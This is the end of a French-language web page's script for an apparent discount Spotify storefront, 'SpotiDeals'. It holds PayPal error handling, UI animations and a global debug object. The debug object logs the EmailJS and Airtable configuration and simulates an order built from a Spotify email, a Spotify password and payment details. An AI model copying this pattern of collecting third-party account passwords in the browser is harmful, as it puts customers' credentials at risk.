              console.error('Erreur PayPal:', err);
              // Afficher un message d'erreur plus élégant
              const errorModal = document.createElement('div');
              errorModal.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #232a34;
                padding: 2rem;
                border-radius: 1rem;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                z-index: 10000;
                text-align: center;
                max-width: 90%;
                width: 400px;
              `;
              errorModal.innerHTML = `
                <div style="color: #ff4444; font-size: 3rem; margin-bottom: 1rem;">⚠️</div>
                <h3 style="color: #ff4444; margin-bottom: 1rem;">Erreur de paiement</h3>
                <p style="margin-bottom: 1rem;">Une erreur est survenue lors du paiement. Veuillez réessayer ou contacter le support.</p>
                <button onclick="this.parentElement.remove()" style="background: #ff4444; color: white; border: none; padding: 0.8rem 2rem; border-radius: 0.5rem; cursor: pointer;">
                  Fermer
                </button>
              `;
              document.body.appendChild(errorModal);
              fallbackButton.style.display = 'block';
            }
          }).render('#paypal-button-container');
        }
      }
      
      // Scroll smooth pour les liens d'ancrage
      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
          e.preventDefault();
          const target = document.querySelector(this.getAttribute('href'));
          if (target) {
            target.scrollIntoView({
              behavior: 'smooth',
              block: 'start'
            });
          }
        });
      });
      
      // Animation au survol des cartes
      document.querySelectorAll('.step-card').forEach(card => {
        card.addEventListener('mouseenter', function() {
          this.style.transform = 'translateY(-10px) scale(1.02)';
        });
        
        card.addEventListener('mouseleave', function() {
          this.style.transform = 'translateY(0) scale(1)';
        });
      });
      
      // Effet de parallaxe simple pour le hero
      window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        const hero = document.querySelector('.hero-section');
        if (hero) {
          hero.style.transform = `translateY(${scrolled * 0.1}px)`;
        }
      });
    });
  </script>
  <!-- Script de diagnostic -->
  <script>
    // =================== FONCTIONS DE DIAGNOSTIC ===================
    window.spotidealsDebug = {
      // Test de la configuration
      testConfig: function() {
        console.log('🔧 Configuration SpotiDeals:');
        console.log('EmailJS:', CONFIG.emailjs);
        console.log('Airtable:', CONFIG.airtable);
        console.log('Support:', CONFIG.support);
        
        // Vérifier EmailJS
        if (typeof emailjs !== 'undefined') {
          console.log('✅ EmailJS chargé');
        } else {
          console.log('❌ EmailJS non chargé');
        }
        
        return CONFIG;
      },
      
      // Test de génération d'ID de commande
      testOrderId: function() {
        const orderId = generateOrderId();
        console.log('🎫 ID de commande généré:', orderId);
        return orderId;
      },
      
      // Test du formatage de date
      testDateFormat: function() {
        const now = new Date();
        const formatted = formatDate(now);
        console.log('📅 Date formatée:', formatted);
        return formatted;
      },
      
      // Simuler une commande de test
      testOrder: async function() {
        console.log('🧪 Test d\'une commande simulée...');
        
        const mockPaypalDetails = {
          id: 'TEST_' + Date.now(),
          payer: {
            email_address: 'test@example.com',
            payer_id: 'TEST_PAYER',
            name: {
              given_name: 'Test',
              surname: 'User'
            }
          },
          purchase_units: [{
            amount: { value: '82.62', currency_code: 'CAD' }
          }]
        };
        
        try {
          const result = await processOrder(
            'test.spotify@example.com',
            'test_password_123',
            mockPaypalDetails
          );
          
          console.log('✅ Test commande réussi:', result);
          return result;
        } catch (error) {
          console.error('❌ Test commande échoué:', error);
          return { success: false, error: error.message };
        }
      },
      
      // Voir l'historique des commandes
      getOrderHistory: function() {
        const history = JSON.parse(localStorage.getItem('spotideals_process_history') || '[]');
        console.log('📊 Historique des commandes:', history);
        return history;
      },
      
      // Voir les emails échoués
      getFailedEmails: function() {
        const failed = JSON.parse(localStorage.getItem('spotideals_failed_emails') || '[]');
        console.log('📧 Emails échoués:', failed);
        return failed;
      },
      
      // Nettoyer les données de test
      cleanup: function() {
        const keys = [
          'spotideals_orders',
          'spotideals_process_history',
          'spotideals_failed_emails',
          'spotideals_pending_sync'
        ];
        
        keys.forEach(key => {
          localStorage.removeItem(key);
          console.log('🧹 Nettoyé:', key);
        });
        
        // Nettoyer les commandes individuelles
        Object.keys(localStorage).forEach(key => {
          if (key.startsWith('order_SD-') || key.startsWith('order_TEST_')) {
            localStorage.removeItem(key);
            console.log('🧹 Nettoyé commande:', key);
          }
        });
        
        console.log('✅ Nettoyage terminé');
      }
    };
    
    // =================== INIT ET HELPERS ===================
  </script>
</body>
</html>
